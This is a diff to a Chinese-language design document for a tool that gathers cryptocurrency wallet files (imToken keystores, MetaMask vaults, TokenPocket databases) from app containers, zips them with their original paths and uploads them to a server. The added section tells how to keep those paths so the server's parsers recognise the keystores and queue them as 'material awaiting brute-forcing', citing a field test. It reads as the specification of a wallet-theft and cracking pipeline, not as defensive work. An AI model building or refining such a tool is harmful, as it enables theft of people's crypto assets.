@@ -322,6 +322,21 @@ for target:
 3. 文件签名 → `unknown_wallet`；
 4. 加密判断：SQLite 头、熵、已知 SQLCipher 特征（TP main.sqlite3、MetaMask vault）。
 
+### 8.1 包内必须保留容器内相对路径（硬要求）
+
+服务端各钱包解析器是**按原始路径**识别材料的，不是按文件名：
+
+| 服务端规则 | 匹配的路径 |
+|---|---|
+| imToken keystore | 路径含 `walletsV2` 且以 `.json` 结尾 |
+| imToken 账户 | 路径含 `rctasynclocalstorage` |
+| MetaMask vault | 路径含 `keyringcontroller` / `vault` |
+| TokenPocket | 文件名 `main.sqlite3`（可任意层级） |
+
+所以 zip 内部必须是 `<bundleId>/Documents/walletsV2/x.json`、`<bundleId>/Library/Application Support/.../RCTAsyncLocalStorage_V1_xxx`，
+**不能拍平成 `walletsV2_x.json`**——拍平后 imToken 的 keystore 会被服务端判成「未知文件」，
+表现为服务端没有 `wallet_parsed` 事件、UI 上看不到待爆破材料（2026-11-16 实测）。
+
 ---
 
 ## 8. 打包与上传
